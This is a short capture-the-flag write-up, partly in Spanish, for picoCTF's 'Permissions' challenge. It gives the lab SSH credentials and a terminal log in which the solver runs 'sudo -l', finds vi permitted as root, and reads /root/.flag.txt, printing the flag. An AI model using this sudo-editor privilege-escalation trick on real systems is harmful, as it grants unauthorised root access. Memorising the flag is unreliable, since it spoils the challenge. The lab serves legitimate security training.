# Permissions

## Objetivo
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 64790 picoplayer@saturn.picoctf.net`Password: `NBD+zO8s4y`Can you login and read the root file?

## Pistas

| No. Pista | Pista                         |
| --------- | ----------------------------- |
| 1         | What permissions do you have? |


## Solucion
```bash
┌──(kali㉿kali)-[~/Documents/parcial1]
└─$ ssh -p 59481 picoplayer@saturn.picoctf.net
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Nov 28 02:29:33 2024 from 200.68.185.171
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on
        challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi /root

[1]+  Stopped                 sudo vi /root
picoplayer@challenge:~$ sudo vi /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
```

## Notas adicionales

## Referencias